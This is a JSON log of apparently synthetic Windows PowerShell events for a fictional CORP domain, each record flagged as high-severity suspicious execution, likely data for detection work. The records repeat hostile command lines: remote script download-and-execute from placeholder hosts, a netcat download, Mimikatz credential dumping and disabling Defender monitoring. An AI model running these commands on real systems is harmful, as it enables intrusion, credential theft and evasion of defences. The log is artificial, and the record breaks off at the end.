  {
    "_time": "2024-01-01T01:34:55",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "185.220.101.45",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T01:35:45",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "91.108.4.12",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T01:36:43",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-FINANCE-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T01:37:19",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "77.91.68.33",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:37:54",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "rjohnson",
    "src_ip": "45.142.212.100",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "script_block": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by rjohnson: powershell.exe -Command \"IEX (New-Object Net.WebClient).Down..."
  },
  {
    "_time": "2024-01-01T01:38:54",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "adavis",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by adavis: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T01:39:51",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "194.165.16.78",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:40:30",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "198.54.117.200",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T01:41:30",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "rjohnson",
    "src_ip": "45.142.212.100",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by rjohnson: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T01:41:37",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "lwhite",
    "src_ip": "77.91.68.33",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by lwhite: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T01:42:13",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-HR-02",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "198.54.117.200",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T01:42:51",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T01:43:00",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "10.0.1.12",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:43:46",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "adavis",
    "src_ip": "185.56.80.65",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by adavis: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T01:44:46",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-FINANCE-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "njones",
    "src_ip": "10.0.2.34",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "command_line": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "script_block": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by njones: powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1..."
  },
  {
    "_time": "2024-01-01T01:45:05",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-FINANCE-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "administrator",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by administrator: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T01:45:38",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "185.220.101.45",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:46:33",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "77.91.68.33",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T01:46:53",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "njones",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "script_block": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by njones: powershell.exe -Command \"IEX (New-Object Net.WebClient).Down..."
  },
  {
    "_time": "2024-01-01T01:47:37",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_sql",
    "src_ip": "10.0.1.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_sql: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T01:47:56",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "103.97.125.220",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:48:52",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "198.54.117.200",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "script_block": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell.exe -Command \"IEX (New-Object Net.WebClient).Down..."
  },
  {
    "_time": "2024-01-01T01:49:34",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "kthomas",
    "src_ip": "198.54.117.200",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by kthomas: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T01:49:51",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "bmartin",
    "src_ip": "45.142.212.100",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by bmartin: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T01:50:32",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "lwhite",
    "src_ip": "185.220.101.45",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by lwhite: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:50:54",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "103.97.125.220",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T01:51:37",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_backup",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_backup: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T01:52:25",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_backup",
    "src_ip": "10.0.2.34",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "script_block": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_backup: powershell.exe -Command \"IEX (New-Object Net.WebClient).Down..."
  },
  {
    "_time": "2024-01-01T01:52:49",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_backup",
    "src_ip": "192.168.1.50",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_backup: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T01:52:59",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "194.165.16.78",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T01:53:12",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_backup",
    "src_ip": "194.165.16.78",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_backup: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T01:54:09",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "192.168.1.101",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:54:43",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-HR-02",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "adavis",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by adavis: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T01:54:53",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_backup",
    "src_ip": "10.0.0.5",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_backup: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T01:55:27",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "lwhite",
    "src_ip": "10.0.2.34",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by lwhite: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T01:55:38",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-HR-02",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "admin",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by admin: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T01:56:22",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "rjohnson",
    "src_ip": "192.168.1.50",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "script_block": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by rjohnson: powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1..."
  },
  {
    "_time": "2024-01-01T01:57:08",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-FINANCE-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "bmartin",
    "src_ip": "185.220.101.45",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "script_block": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by bmartin: powershell.exe -Command \"IEX (New-Object Net.WebClient).Down..."
  },
  {
    "_time": "2024-01-01T01:57:44",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-FINANCE-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "adavis",
    "src_ip": "77.91.68.33",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by adavis: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T01:58:12",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "admin",
    "src_ip": "77.91.68.33",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by admin: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T01:59:10",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "185.220.101.45",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T01:59:28",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "91.108.4.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:00:07",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
